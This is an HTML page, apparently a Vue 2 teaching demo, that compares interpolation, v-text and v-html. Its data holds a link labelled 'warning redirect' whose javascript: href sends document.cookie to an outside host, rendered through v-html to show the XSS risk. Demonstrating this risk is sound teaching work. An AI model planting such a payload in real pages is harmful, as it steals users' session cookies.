<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Document</title>
    </head>
    <body>
        <div id="root">
            <div>{{name}}</div>
            <div v-text="name"></div>
            <div v-html="str"></div>
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.14/vue.js"></script>
        <script>
            let vm = new Vue({
                el: "#root",
                data: {
                    name: "minghe",
                    str: "<a href=javascript:location.href='https://google.com?' + document.cookie>警告跳轉</a>",
                },
            });
        </script>
    </body>
</html>
